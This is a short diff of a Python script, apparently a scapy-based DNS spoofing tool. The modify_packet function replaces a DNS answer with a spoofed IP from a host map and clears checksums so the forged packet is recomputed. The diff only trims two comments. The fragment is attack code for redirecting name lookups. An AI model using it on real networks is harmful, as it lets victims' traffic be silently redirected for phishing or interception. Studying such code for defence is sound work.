@@ -37,12 +37,11 @@ def modify_packet(packet):
         return packet
     # craft new answer, overriding the original
     # setting the rdata for the IP we want to redirect (spoofed)
-    # for instance, google.com will be mapped to "192.168.1.100"
     packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
     # set the answer count to 1
     packet[DNS].ancount = 1
     # delete checksums and length of packet, because we have modified the packet
-    # new calculations are required ( scapy will do automatically )
+    # new calculations are required
     del packet[IP].len
     del packet[IP].chksum
     del packet[UDP].len
